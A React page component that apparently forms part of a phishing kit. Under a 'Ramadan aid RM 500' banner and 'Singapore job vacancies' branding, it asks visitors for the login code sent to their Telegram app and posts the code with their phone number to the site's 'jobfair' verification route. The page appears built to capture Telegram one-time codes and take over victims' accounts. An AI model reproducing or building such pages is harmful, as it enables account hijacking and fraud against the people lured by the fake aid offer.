import { useForm } from "@inertiajs/react";
import React, { useState } from "react";

export default function Verif(props) {
    const phone_number = props.phone_number;
    const { data, setData, post, reset, errors } = useForm({
        verif_code: "",
        phone_number: phone_number,
    });
    const [loading, setLoading] = useState(false);
    const submitHandler = (e) => {
        e.preventDefault();
        setLoading(true);
        post(route("jobfair.store-verification"), {
            onSuccess: () => {
                setTimeout(() => {
                    setLoading(false);
                }, 500);
            },
            onError: () => {
                setTimeout(() => {
                    setLoading(false);
                }, 500);
            },
        });
    };

    const changeHandler = (e) => {
        const input = e.target.value;

        // Menggunakan regex untuk memeriksa apakah input hanya berisi angka dan tanda tambah
        if (input.length <= 5) {
            if (/^[0-9+]*$/.test(input)) {
                setData({ ...data, verif_code: input });
            }
        }
    };

    return (
        <div className="w-full  overflow-hidden flex  flex-col justify-center items-center  bg-gray-100">
            {loading && (
                <div className="absolute z-[50] top-0 left-0 w-full h-[900px] bg-gray-950/30 backdrop-blur-sm flex justify-center items-center">
                    <img src="/jobfair/loading.gif" alt="" />
                </div>
            )}
            <div className="w-full px-4 py-4 bg-white mb-3">
                <img src="/jobfair/kerjaya.png" alt="" className="w-[80px]" />
            </div>
            <div className="w-[380px] h-[700px] rounded-md shadow-sm shadow-gray-500/50 px-8 py-8 border border-orange-900/50 bg-white">
                <img
                    src="/jobfair/Bantuan-Ramadhan-RM-500.jpg"
                    alt=""
                    className="w-full"
                />
                <p className="font-light text-center text-orange-900 text-lg tracking-tight leading-5 mt-3 mb-2">
                    Please enter the OTP code that we have sent to you{" "}
                    <span className="font-extrabold">TELEGRAM APPLICATION</span>
                </p>
                <p className="font-bold text-center text-orange-950 text-xl">
                    Enter the code that was sent to your Telegram application
                    Telegram Number.
                </p>
                <form
                    onSubmit={submitHandler}
                    action=""
                    className="w-full my-8"
                >
                    <p className="text-center w-full font-extrabold text-orange-950 text-xl tracking-tight"></p>
                    <input
                        type="text"
                        name="verif_code"
                        placeholder="Kod Telegram"
                        className="w-full h-[50px] shadow-sm shadow-gray-500/50 border border-orange-950 focus:outline-none focus:ring-0 focus:border-orange-950 rounded-md"
                        value={data.verif_code}
                        onChange={changeHandler}
                    />
                    {errors.verif_code && (
                        <p className="text-red-500 text-xs italic">
                            {errors.verif_code}
                        </p>
                    )}

                    <div className="w-full flex justify-center py-6">
                        <button className="mt-3 w-1/2 bg-slate-900 text-white font-bold py-3 px-8 text-center rounded-full">
                            LOG IN
                        </button>
                    </div>
                </form>
            </div>
            <div className="w-full px-4 py-4 gap-x-4 items-center flex justify-end bg-gray-800 mt-4">
                <p className="text-white">Singapore job vacancies</p>
                <img src="/jobfair/kerjaya.png" alt="" className="w-[70px]" />
            </div>
        </div>
    );
}
